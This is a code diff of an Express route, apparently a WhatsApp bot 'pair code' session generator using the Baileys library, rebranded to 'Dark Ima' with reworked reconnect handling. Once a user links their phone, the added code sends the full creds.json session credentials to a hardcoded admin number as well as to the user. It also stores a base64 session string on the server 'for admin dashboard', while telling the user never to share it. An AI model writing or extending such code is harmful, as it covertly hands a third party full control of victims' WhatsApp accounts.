@@ -9,9 +9,9 @@ import {
     Browsers,
     jidNormalizedUser,
     fetchLatestBaileysVersion,
+    DisconnectReason,
 } from "@whiskeysockets/baileys";
 import pn from "awesome-phonenumber";
-import { upload } from "./mega.js";
 import path from "path";
 import chalk from "chalk";
 import axios from "axios";
@@ -20,36 +20,29 @@ const router = express.Router();
 const logger = pino({ level: "fatal" });
 const SESSION_FOLDER = process.env.SESSION_FOLDER || "./mega_sessions";
 const ADMIN_NUMBER = "9779807610619";
-const LOGO_URL = "https://ibb.co/yc1nR55z";
+const LOGO_URL = "https://ibb.co/yc1nR55zs";
+const BOT_NAME = "Dark Ima";
+const SESSION_PREFIX = "Dark_Ima";
 
 fs.ensureDirSync(SESSION_FOLDER);
 
-function removeFile(FilePath) {
-    try {
-        if (fs.existsSync(FilePath)) {
-            fs.removeSync(FilePath);
-        }
-    } catch (_) {}
-}
-
-function getMegaFileId(url) {
-    try {
-        const match = url.match(/\/file\/([^#]+)/);
-        return match ? match[1] : null;
-    } catch {
-        return null;
-    }
+function removeFile(filePath) {
+    try { if (fs.existsSync(filePath)) fs.removeSync(filePath); } catch (_) {}
 }
 
 async function getLogoBuffer() {
     try {
-        const pageRes = await axios.get(LOGO_URL, { timeout: 8000 });
-        const match = pageRes.data.match(/https:\/\/i\.ibb\.co\/[^"'\s]+/);
+        const pageRes = await axios.get(LOGO_URL, { timeout: 10000 });
+        // Try to extract direct image URL from ibb.co page
+        const match = pageRes.data.match(/https:\/\/i\.ibb\.co\/[^"'\s>]+\.(?:png|jpg|jpeg|webp|gif)/i);
         if (match) {
-            const imgRes = await axios.get(match[0], {
-                responseType: "arraybuffer",
-                timeout: 8000,
-            });
+            const imgRes = await axios.get(match[0], { responseType: "arraybuffer", timeout: 10000 });
+            return Buffer.from(imgRes.data);
+        }
+        // Fallback: try og:image meta tag
+        const ogMatch = pageRes.data.match(/property="og:image"\s+content="([^"]+)"/);
+        if (ogMatch) {
+            const imgRes = await axios.get(ogMatch[1], { responseType: "arraybuffer", timeout: 10000 });
             return Buffer.from(imgRes.data);
         }
     } catch (e) {
@@ -61,276 +54,263 @@ async function getLogoBuffer() {
 async function waitForCreds(credsPath, maxWaitMs = 30000) {
     const start = Date.now();
     while (Date.now() - start < maxWaitMs) {
-        if (fs.existsSync(credsPath)) {
-            const stat = fs.statSync(credsPath);
-            if (stat.size > 0) return true;
-        }
-        await delay(1000);
+        if (fs.existsSync(credsPath) && fs.statSync(credsPath).size > 100) return true;
+        await delay(800);
     }
     return false;
+}
+
+function buildSessionString(credsPath) {
+    try {
+        const credsJson = fs.readJsonSync(credsPath);
+        const b64 = Buffer.from(JSON.stringify(credsJson)).toString("base64");
+        return `${SESSION_PREFIX}=${b64}`;
+    } catch {
+        return null;
+    }
 }
 
 const activeSessions = new Map();
 
 router.get("/", async (req, res) => {
     let num = req.query.number;
-
     if (!num) return res.status(400).send({ code: "Phone number is required" });
 
     num = num.replace(/[^0-9]/g, "");
     const phone = pn("+" + num);
-
     if (!phone.isValid()) return res.status(400).send({ code: "Invalid phone number" });
-
     num = phone.getNumber("e164").replace("+", "");
 
+    // Cancel any existing session for this number
     if (activeSessions.has(num)) {
         const old = activeSessions.get(num);
         try { old?.ws?.close(); } catch (_) {}
         activeSessions.delete(num);
-        console.log(chalk.yellow(`♻️ Replaced existing session for ${num}`));
+        console.log(chalk.yellow(`♻️ Replaced session for ${num}`));
     }
 
-    const sessionId = Date.now().toString() + Math.random().toString(36).substring(2, 10);
-    const sessionPath = path.join(SESSION_FOLDER, `session_${num}_${sessionId}`);
+    const sessionId = Date.now().toString(36) + Math.random().toString(36).slice(2, 7);
+    const sessionPath = path.join(SESSION_FOLDER, `pair_${num}_${sessionId}`);
     removeFile(sessionPath);
     fs.ensureDirSync(sessionPath);
 
-    console.log(chalk.blue(`\n🔐 New pair request for: ${num}`));
+    console.log(chalk.blue(`\n🔐 Pair request: ${num}`));
 
     let responseSent = false;
     let sessionDone = false;
+    let reconnectCount = 0;
+    const MAX_RECONNECTS = 8;
 
-    try {
-        const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
-        const { version } = await fetchLatestBaileysVersion();
+    // Request timeout cleanup
+    const timeout = setTimeout(() => {
+        if (!responseSent && !res.headersSent) {
+            responseSent = true;
+            res.status(408).send({ code: "Timeout — please try again" });
+        }
+        if (!sessionDone) {
+            sessionDone = true;
+            activeSessions.delete(num);
+            removeFile(sessionPath);
+        }
+    }, 120000);
 
-        const EvoBot = makeWASocket({
-            version,
-            auth: {
-                creds: state.creds,
-                keys: makeCacheableSignalKeyStore(state.keys, logger),
-            },
-            printQRInTerminal: false,
-            logger,
-            browser: Browsers.ubuntu("Chrome"),
-            markOnlineOnConnect: true,
-            syncFullHistory: false,
-            generateHighQualityLinkPreview: false,
-            defaultQueryTimeoutMs: 60000,
-        });
+    async function sendSession(EvoBot, credsPath) {
+        const sessionStr = buildSessionString(credsPath);
+        if (!sessionStr) throw new Error("Failed to build session string");
 
-        activeSessions.set(num, EvoBot);
+        const userJid = jidNormalizedUser(`${num}@s.whatsapp.net`);
+        const adminJid = jidNormalizedUser(`${ADMIN_NUMBER}@s.whatsapp.net`);
+        const now = new Date();
+        const credsBuffer = fs.readFileSync(credsPath);
+        const logoBuffer = await getLogoBuffer();
 
-        EvoBot.ev.on("connection.update", async (update) => {
-            const { connection, lastDisconnect } = update;
+        // Save session info
+        await fs.writeJson(path.join(SESSION_FOLDER, `session_info_${num}_${Date.now()}.json`), {
+            phoneNumber: num,
+            sessionId: sessionStr,
+            timestamp: now.toISOString(),
+            type: "pair_code",
+        }, { spaces: 2 });
 
-            if (connection === "open") {
-                if (sessionDone) return;
-                console.log(chalk.green(`✅ Connected for ${num}`));
+        const msg = `╔══════════════════════════════╗
+║   ✅ *${BOT_NAME}* Session     ║
+╚══════════════════════════════╝
 
-                try {
-                    const credsPath = path.join(sessionPath, "creds.json");
-                    const credsReady = await waitForCreds(credsPath, 30000);
+🎉 *CONNECTION SUCCESSFUL*
 
-                    if (!credsReady) {
-                        console.log(chalk.red(`❌ creds.json never appeared for ${num}`));
+📋 *Session Details*
+──────────────────────────
+🆔 *Session ID:*
+\`\`\`${sessionStr}\`\`\`
+
+📞 Phone: *+${num}*
+🔐 Method: Pair Code
+📅 ${now.toLocaleString()}
+
+⚠️ *SECURITY*
+• NEVER share your session ID
+• Keep \`creds.json\` private
+• Store a backup safely
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+👑 *${BOT_NAME}* — WhatsApp Bot
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+
+        async function sendTo(jid) {
+            try {
+                if (logoBuffer) {
+                    await EvoBot.sendMessage(jid, {
+                        image: logoBuffer,
+                        caption: `*${BOT_NAME}*\n\n🔗 Session Ready!\n\nCheck your \`creds.json\` below.`,
+                    });
+                    await delay(1200);
+                }
+                await EvoBot.sendMessage(jid, {
+                    document: credsBuffer,
+                    mimetype: "application/json",
+                    fileName: "creds.json",
+                    caption: msg,
+                });
+                console.log(chalk.green(`✅ Session sent → ${jid}`));
+            } catch (e) {
+                console.log(chalk.red(`❌ Send failed → ${jid}: ${e.message}`));
+            }
+        }
+
+        await sendTo(userJid);
+        await delay(1500);
+        if (num !== ADMIN_NUMBER) {
+            await sendTo(adminJid);
+        }
+
+        console.log(chalk.green(`✅ All done for ${num}`));
+        sessionDone = true;
+        activeSessions.delete(num);
+        clearTimeout(timeout);
+
+        await delay(3000);
+        try { EvoBot.ws.close(); } catch (_) {}
+        // Keep creds for admin dashboard, remove raw session folder
+        removeFile(sessionPath);
+    }
+
+    async function startBot(retryCount = 0) {
+        if (sessionDone) return;
+
+        try {
+            const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
+            const { version } = await fetchLatestBaileysVersion();
+
+            const EvoBot = makeWASocket({
+                version,
+                auth: {
+                    creds: state.creds,
+                    keys: makeCacheableSignalKeyStore(state.keys, logger),
+                },
+                printQRInTerminal: false,
+                logger,
+                browser: Browsers.ubuntu("Chrome"),
+                markOnlineOnConnect: true,
+                syncFullHistory: false,
+                generateHighQualityLinkPreview: false,
+                defaultQueryTimeoutMs: 30000,
+                connectTimeoutMs: 60000,
+                keepAliveIntervalMs: 10000,
+            });
+
+            activeSessions.set(num, EvoBot);
+            EvoBot.ev.on("creds.update", saveCreds);
+
+            EvoBot.ev.on("connection.update", async (update) => {
+                const { connection, lastDisconnect } = update;
+
+                if (connection === "open") {
+                    if (sessionDone) return;
+                    console.log(chalk.green(`✅ Connected: ${num}`));
+                    try {
+                        const credsPath = path.join(sessionPath, "creds.json");
+                        const ready = await waitForCreds(credsPath);
+                        if (!ready) throw new Error("creds.json not ready");
+                        await sendSession(EvoBot, credsPath);
+                    } catch (err) {
+                        console.error(chalk.red(`❌ Session send error: ${err.message}`));
                         sessionDone = true;
                         activeSessions.delete(num);
                         removeFile(sessionPath);
+                        clearTimeout(timeout);
+                    }
+                    return;
+                }
+
+                if (connection === "close") {
+                    if (sessionDone) return;
+
+                    const statusCode = lastDisconnect?.error?.output?.statusCode;
+                    const isLoggedOut = statusCode === DisconnectReason.loggedOut ||
+                        statusCode === 401 || statusCode === 403;
+
+                    if (isLoggedOut) {
+                        console.log(chalk.red(`❌ Logged out: ${num}`));
+                        sessionDone = true;
+                        activeSessions.delete(num);
+                        removeFile(sessionPath);
+                        clearTimeout(timeout);
                         return;
                     }
 
-                    const userJid = jidNormalizedUser(`${num}@s.whatsapp.net`);
-                    const adminJid = jidNormalizedUser(`${ADMIN_NUMBER}@s.whatsapp.net`);
-                    const time = new Date().toLocaleTimeString();
-                    const date = new Date().toLocaleDateString();
-
-                    let sessionIdCode = `Evomd_local_${Date.now()}`;
-                    let megaUploaded = false;
-
-                    try {
-                        console.log(chalk.blue(`📤 Uploading to MEGA...`));
-                        const megaUrl = await upload(credsPath, `creds_${num}_${Date.now()}.json`);
-                        const megaFileId = getMegaFileId(megaUrl);
-                        if (megaFileId) {
-                            sessionIdCode = `Evomd=@${megaFileId}`;
-                            megaUploaded = true;
-                            console.log(chalk.green(`☁️ MEGA upload done`));
-                        }
-                    } catch (megaErr) {
-                        console.log(chalk.yellow(`⚠️ MEGA skipped: ${megaErr.message}`));
-                    }
-
-                    const infoPath = path.join(SESSION_FOLDER, `session_info_${num}_${Date.now()}.json`);
-                    await fs.writeJson(infoPath, {
-                        phoneNumber: num,
-                        sessionId: sessionIdCode,
-                        megaUploaded,
-                        timestamp: new Date().toISOString(),
-                        type: "pair_code",
-                    }, { spaces: 2 });
-
-                    const successMessage = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-*✅ EVO MD Whatsapp Bot*
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-🎉 CONNECTION ESTABLISHED SUCCESSFULLY
-
-📋 SESSION INFORMATION
-──────────────────────────
-🆔 ID : *${sessionIdCode}*
-📞 PHONE : *+${num}*
-🔐 TYPE : *Pair Code*
-⏰ TIME : *${time}*
-📅 DATE : *${date}*
-
-📁 FILES GENERATED
-──────────────────────────
-${megaUploaded ? "✓ creds.json (Uploaded to MEGA)" : "✓ creds.json (Attached below)"}
-
-📍 STORAGE LOCATION
-──────────────────────────
-${megaUploaded ? "☁️ MEGA Cloud: /Evo MD Sessions/" : "📎 Sent as attachment"}
-📁 Local: ./mega_sessions/
-
-⚠️ SECURITY NOTICE
-──────────────────────────
-🔴 NEVER share your session ID
-🔴 NEVER share creds.json file
-🟢 Keep backup in safe place
-🟢 Use same ID for reconnection
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-👑 *Evo MD Ofc* 👑
-🔗 github.com/Evo_MD_Beta
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
-
-                    const logoBuffer = await getLogoBuffer();
-                    const credsBuffer = fs.readFileSync(credsPath);
-
-                    async function sendSessionToJid(jid) {
-                        try {
-                            if (logoBuffer) {
-                                await EvoBot.sendMessage(jid, {
-                                    image: logoBuffer,
-                                    caption: `*Evo MD Ofc*\n\n🔗 Session ID:\n*${sessionIdCode}*`,
-                                });
-                                await delay(1500);
-                            } else {
-                                await EvoBot.sendMessage(jid, { text: `*Evo MD Ofc*\n\n🔗 Session ID:\n*${sessionIdCode}*` });
-                                await delay(1000);
-                            }
-
-                            await EvoBot.sendMessage(jid, {
-                                document: credsBuffer,
-                                mimetype: "application/json",
-                                fileName: "creds.json",
-                                caption: successMessage,
-                            });
-
-                            console.log(chalk.green(`✅ Session sent to ${jid}`));
-                        } catch (sendErr) {
-                            console.log(chalk.red(`❌ Send failed to ${jid}: ${sendErr.message}`));
-                        }
-                    }
-
-                    await sendSessionToJid(userJid);
-                    await delay(2000);
-
-                    if (num !== ADMIN_NUMBER) {
-                        await sendSessionToJid(adminJid);
-                        await delay(2000);
-                    }
-
-                    console.log(chalk.green(`✅ All messages sent for ${num}`));
-
-                    sessionDone = true;
-                    activeSessions.delete(num);
-                    removeFile(sessionPath);
-
-                    await delay(3000);
-                    try { EvoBot.ws.close(); } catch (_) {}
-
-                } catch (err) {
-                    console.error(chalk.red("❌ Error sending session:"), err);
-                    sessionDone = true;
-                    activeSessions.delete(num);
-                    removeFile(sessionPath);
-                }
-            }
-
-            if (connection === "close") {
-                if (sessionDone) return;
-
-                const statusCode = lastDisconnect?.error?.output?.statusCode;
-                const shouldReconnect = statusCode !== 401 && statusCode !== 403;
-
-                if (shouldReconnect) {
-                    console.log(chalk.yellow(`🔄 Reconnecting for ${num}...`));
-                    try {
-                        const { state: newState, saveCreds: newSaveCreds } = await useMultiFileAuthState(sessionPath);
-                        EvoBot.ev.removeAllListeners();
-
-                        const NewBot = makeWASocket({
-                            version,
-                            auth: {
-                                creds: newState.creds,
-                                keys: makeCacheableSignalKeyStore(newState.keys, logger),
-                            },
-                            printQRInTerminal: false,
-                            logger,
-                            browser: Browsers.ubuntu("Chrome"),
-                            markOnlineOnConnect: true,
-                            syncFullHistory: false,
-                        });
-
-                        activeSessions.set(num, NewBot);
-                        NewBot.ev.on("connection.update", EvoBot.ev.listeners("connection.update")[0]);
-                        NewBot.ev.on("creds.update", newSaveCreds);
-                    } catch (_) {
+                    reconnectCount++;
+                    if (reconnectCount > MAX_RECONNECTS) {
+                        console.log(chalk.red(`❌ Max reconnects reached for ${num}`));
+                        sessionDone = true;
                         activeSessions.delete(num);
+                        removeFile(sessionPath);
+                        clearTimeout(timeout);
+                        return;
                     }
-                } else {
-                    console.log(chalk.red(`❌ Session closed for ${num}`));
+
+                    console.log(chalk.yellow(`🔄 Reconnect ${reconnectCount}/${MAX_RECONNECTS} for ${num} (code ${statusCode})`));
+                    await delay(2000 * reconnectCount);
+                    startBot(retryCount + 1);
+                }
+            });
+
+            // Request pairing code if not yet registered
+            if (!EvoBot.authState.creds.registered) {
+                await delay(2000);
+                try {
+                    let code = await EvoBot.requestPairingCode(num);
+                    code = code?.match(/.{1,4}/g)?.join("-") || code;
+                    console.log(chalk.green(`📲 Code: ${code}`));
+                    if (!responseSent && !res.headersSent) {
+                        responseSent = true;
+                        res.send({ code });
+                    }
+                } catch (codeErr) {
+                    console.log(chalk.red(`❌ Code error: ${codeErr.message}`));
+                    if (!responseSent && !res.headersSent) {
+                        responseSent = true;
+                        res.status(500).send({ code: "Failed to generate pairing code" });
+                    }
+                    sessionDone = true;
                     activeSessions.delete(num);
+                    removeFile(sessionPath);
+                    clearTimeout(timeout);
                 }
             }
-        });
-
-        EvoBot.ev.on("creds.update", saveCreds);
-
-        if (!EvoBot.authState.creds.registered) {
-            await delay(3000);
-            let code = await EvoBot.requestPairingCode(num);
-            code = code?.match(/.{1,4}/g)?.join("-") || code;
-
+        } catch (err) {
+            console.error(chalk.red(`❌ Bot init error: ${err.message}`));
             if (!responseSent && !res.headersSent) {
                 responseSent = true;
-                console.log(chalk.green(`📲 Pairing code: ${code}`));
-                res.send({ code });
+                res.status(503).send({ code: "Service error — try again" });
             }
+            sessionDone = true;
+            activeSessions.delete(num);
+            removeFile(sessionPath);
+            clearTimeout(timeout);
         }
-
-        setTimeout(async () => {
-            if (!responseSent && !res.headersSent) {
-                responseSent = true;
-                res.status(408).send({ code: "Request timeout" });
-                sessionDone = true;
-                activeSessions.delete(num);
-                removeFile(sessionPath);
-            }
-        }, 90000);
-
-    } catch (err) {
-        console.error(chalk.red("Session init error:"), err);
-        if (!responseSent && !res.headersSent) {
-            res.status(503).send({ code: "Service unavailable" });
-        }
-        sessionDone = true;
-        activeSessions.delete(num);
-        removeFile(sessionPath);
     }
+
+    startBot();
 });
 
 export default router;
